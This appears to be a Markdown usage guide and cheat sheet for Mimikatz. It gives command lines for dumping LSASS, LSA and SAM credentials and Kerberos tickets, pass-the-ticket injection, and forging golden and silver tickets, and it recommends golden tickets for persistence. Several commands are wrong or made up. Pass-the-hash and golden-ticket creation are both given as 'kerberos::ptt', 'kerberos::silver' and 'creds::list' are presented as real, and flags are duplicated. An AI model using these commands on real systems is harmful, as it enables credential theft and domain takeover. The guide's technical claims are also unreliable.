# Mimikatz

**Type:** Post-Exploitation & Credential Dumping Tool
**Focus:** **Mimikatz** is one of the most famous post-exploitation tools used to extract credentials from **Windows machines**. It can dump **password hashes**, **Kerberos tickets**, and **clear-text passwords**. It can also be used for **pass-the-hash**, **pass-the-ticket**, and **kerberos ticket forging** attacks. Due to its power and versatility, **Mimikatz** is commonly used in **red team** and **penetration testing** engagements, but it can also be misused by attackers in real-world attacks.

---

## 1. Full Feature Overview

* **Credential Dumping**: Mimikatz can extract **plain-text passwords**, **NTLM hashes**, **Kerberos tickets**, and **LSA secrets**.
* **Pass-the-Hash**: It supports **pass-the-hash** attacks, enabling lateral movement by leveraging NTLM hashes rather than clear-text passwords.
* **Pass-the-Ticket**: Mimikatz can extract and use **Kerberos tickets** to impersonate users or escalate privileges.
* **Kerberos Ticket Forging**: You can forge **Kerberos tickets** (TGTs, TGS) to impersonate users and bypass authentication mechanisms.
* **Golden Ticket Attacks**: Mimikatz allows the creation of **Golden Tickets**, enabling attackers to gain **unlimited access** to a domain.
* **Silver Ticket Attacks**: Mimikatz also supports **Silver Tickets**, which are used for accessing specific services.
* **LSA Secrets Dumping**: It can dump **LSA Secrets**, which are stored password hashes of accounts and keys for various services.

---

## 2. Requirements & Setup

### Requirements

* **Administrator/Root Access**: Mimikatz requires **admin/root** privileges to function properly.
* **Windows OS**: Mimikatz works exclusively on **Windows** machines (though it can be used to attack Windows systems remotely from another machine).

### Installation

1. **Download the Latest Version**:

   Download the latest release of **Mimikatz** from the official GitHub repository:

   [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

   Alternatively, you can download a precompiled version from the release section or compile it yourself.

2. **Compile (Optional)**:

   If you choose to compile it yourself, you will need **Visual Studio** and the **Windows SDK**.

   * Clone the repository:

     ```bash
     git clone https://github.com/gentilkiwi/mimikatz.git
     cd mimikatz
     ```

   * Open **mimikatz.sln** in **Visual Studio** and build the solution.

3. **Run Mimikatz**:

   No installation is required for running Mimikatz. Just run the executable:

   ```bash
   mimikatz.exe
   ```

---

## 3. Core Usage

### 3.1 Basic Syntax

To run **Mimikatz**, simply execute it from the command line (with elevated privileges):

```bash
mimikatz.exe
```

This will open the Mimikatz interactive console, where you can enter commands.

### 3.2 Dumping Credentials

#### Dumping Password Hashes:

To dump **NTLM hashes** from memory:

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

* This command dumps passwords, hashes, and tickets from the **LSASS** process memory.
* It will show you usernames, domain names, and the **NTLM hashes** (if available).

#### Dumping LSA Secrets:

To dump **LSA secrets** (which store cached credentials):

```bash
mimikatz.exe "privilege::debug" "lsadump::lsa"
```

#### Dumping Kerberos Tickets:

To dump **Kerberos tickets** from memory:

```bash
mimikatz.exe "privilege::debug" "sekurlsa::tickets"
```

* This will dump **TGT (Ticket Granting Ticket)** and **TGS (Ticket Granting Service)** tickets from memory.

---

### 3.3 Pass-the-Hash (PTH) Attacks

With the **NTLM hash** of an account, you can authenticate as that user using **pass-the-hash**:

```bash
mimikatz.exe "kerberos::ptt <ticket_file>"
```

You can also use the extracted **NTLM hash** for **SMB** or **RDP** authentication using tools like **Evil-WinRM** or **CrackMapExec**.

### 3.4 Pass-the-Ticket (PTT) Attacks

To use a **Kerberos ticket** for authentication (without needing the password), use the following command:

```bash
mimikatz.exe "kerberos::ptt <ticket_file>"
```

* This allows you to inject **Kerberos tickets** (TGT or TGS) directly into the memory of the current session.

### 3.5 Golden Ticket Creation

To create a **Golden Ticket** using a known **KRBTGT** account password:

```bash
mimikatz.exe "kerberos::ptt /ticket:<ticket_file>"
```

* **Golden Tickets** allow you to **bypass Kerberos authentication** and gain **domain-wide access**.
* You will need the **KRBTGT account hash** and the **domain SID**.

#### Example Golden Ticket Creation:

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890 /rc4:0123456789abcdef0123456789abcdef /ticket:<ticket_file>"
```

This will create a **Golden Ticket** for the **Administrator** account in the domain **example.com**.

### 3.6 Silver Ticket Creation

To create a **Silver Ticket** (specific service access):

```bash
mimikatz.exe "kerberos::silver /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890 /rc4:0123456789abcdef0123456789abcdef /sid:<service_sid> /target:<service_fqdn> /ticket:<ticket_file>"
```

* **Silver Tickets** are useful for accessing specific services like **SQL** or **RDP** without needing the TGT.

### 3.7 Dumping Credentials Using Windows Credential Manager

To dump credentials stored in **Windows Credential Manager**:

```bash
mimikatz.exe "privilege::debug" "creds::list"
```

This will list credentials stored in the **Credential Manager** (e.g., **RDP credentials**, **FTP credentials**, etc.).

---

## 4. Advanced Features & Techniques

### 4.1 Passwords from Memory

If **Mimikatz** is unable to directly retrieve passwords from **LSASS**, you can try dumping them from the memory itself using:

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp"
```

This will create a memory dump of the **LSASS** process, which you can analyze offline to extract credentials.

### 4.2 RDP and SMB with Hashes

You can use **Mimikatz** to dump the **NTLM hash**, and then use it for **RDP** or **SMB**:

```bash
mimikatz.exe "lsadump::sam"
```

Once you have the NTLM hash, you can authenticate using **Evil-WinRM** or **CrackMapExec** to remotely access systems using the hash.

---

### 4.3 Network Authentication with Golden Tickets

Golden Tickets can be injected into **Kerberos**-based systems for lateral movement:

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:example.com /sid:<domain_sid> /rc4:<ticket_hash> /rc4:<target_kerberos_ticket> /ticket:<output_ticket>"
```

This command allows you to forge a **Golden Ticket** that will be accepted by any **Kerberos** service in the domain.

---

## 5. Tips, Tricks, Best Practices

* **Use with Elevated Privileges**: Most of the features, especially **LSA Secrets** and **Kerberos Tickets**, require **Administrator** or **SYSTEM** access.

* **Memory Dumping**: When using **minidump** techniques, ensure you have the correct privileges to dump **LSASS** memory.

* **Bypass UAC**: You can also use **Mimikatz** to bypass **User Account Control (UAC)** for elevated privileges:

  ```bash
  mimikatz.exe "token::elevate"
  ```

* **Persistence**: You can create a **Golden Ticket** and use it for **long-term persistence** in the network, as the Golden Ticket has **domain-wide access**.

---

## 6. Cheat Sheet

```bash
# Dump credentials from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

# Dump LSA Secrets
mimikatz.exe "privilege::debug" "lsadump::lsa"

# Dump Kerberos Tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets"

# Pass-the-Hash
mimikatz.exe "kerberos::ptt <ticket_file>"

# Create a Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890 /rc4:0123456789abcdef0123456789abcdef"

#Create a Silver Ticket
mimikatz.exe "kerberos::silver /user\:Administrator /domain\:example.com /sid\:S-1-5-21-1234567890 /rc4:0123456789abcdef0123456789abcdef /sid:\<service\_sid> /target:\<service\_fqdn>"

# Dump credentials from Windows Credential Manager

mimikatz.exe "creds::list"
```

